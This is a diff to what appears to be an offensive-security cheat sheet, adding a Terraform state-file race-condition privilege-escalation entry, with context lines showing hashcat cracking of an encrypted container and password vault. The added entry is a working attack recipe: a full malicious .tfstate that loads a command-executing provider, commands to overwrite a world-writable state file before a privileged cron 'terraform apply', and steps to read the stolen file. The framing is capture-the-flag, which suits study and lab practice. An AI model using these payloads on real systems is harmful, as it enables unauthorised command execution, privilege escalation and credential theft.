@@ -70,3 +70,59 @@ hashcat -m 13751 container.vc -a 0 /usr/share/wordlists/rockyou.txt
 hashcat -m 5200 vault.psafe3 /usr/share/wordlists/rockyou.txt
 # Open with PasswordSafe app to retrieve stored credentials
 ```
+
+---
+
+### Terraform State File Race Condition RCE [added: 2026-05]
+- **Tags:** #Terraform #StateFile #RCE #PrivEsc #CronRace #Linux #IaC #TerraformProvider #WritableTemp #ScheduledTask #TfstateInjection
+- **Trigger:** World-writable `/tmp/terraform.tfstate` found; cron or timer runs `terraform apply` as a more-privileged user; can write to the state file location before the next cron tick
+- **Prereq:** Write access to the terraform state file path (e.g. `/tmp/terraform.tfstate`); Terraform binary present; cron runs `terraform apply -auto-approve` as target user on a fixed interval (≤ 1 min is exploitable)
+- **Yields:** Arbitrary OS command execution as the privileged cron user; read any file owned by that user (e.g. `/home/tfuser/flag`)
+- **Opsec:** Med (terraform provider download may generate outbound traffic; cron output visible in log files)
+- **Context:** When `terraform apply` runs against a state file referencing an unknown provider (e.g. `offensive-actions/statefile-rce`), Terraform downloads and executes the provider binary. The `statefile-rce` provider executes the `command` attribute from the state resource during apply. If the state file path is world-writable (e.g. in `/tmp`), any low-priv user can race-write a malicious `.tfstate` before the privileged cron fires. Base64-encode the JSON payload to avoid shell escaping issues during delivery.
+- **Payload/Method:**
+```bash
+# Step 1: Confirm cron and writable state file
+cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i cron  # or: ps aux | grep -i cron
+ls -la /tmp/terraform.tfstate  # must be world-writable
+
+# Step 2: Craft malicious state JSON (adjust command to taste)
+cat > /tmp/evil.tfstate << 'JSON'
+{
+  "version": 4,
+  "terraform_version": "1.14.3",
+  "serial": 32,
+  "lineage": "c8c47398-2682-2867-f35d-41516ed952e5",
+  "outputs": {},
+  "resources": [
+    {
+      "mode": "managed",
+      "type": "rce",
+      "name": "copy_flag_for_me",
+      "provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
+      "instances": [
+        {
+          "schema_version": 0,
+          "attributes": {
+            "command": "cat /home/tfuser/flag > /tmp/flag && chmod 777 /tmp/flag",
+            "id": "rce"
+          },
+          "sensitive_attributes": [],
+          "private": "bnVsbA=="
+        }
+      ]
+    }
+  ],
+  "check_results": null
+}
+JSON
+
+# Step 3: Deliver via base64 to avoid escaping issues, then set permissions
+base64 /tmp/evil.tfstate | tr -d '\n' > /tmp/evil.b64
+echo "$(cat /tmp/evil.b64)" | base64 -d > /tmp/terraform.tfstate
+chmod 777 /tmp/terraform.tfstate
+
+# Step 4: Wait for cron tick — then read exfiltrated output
+sleep 65
+cat /tmp/flag
+```
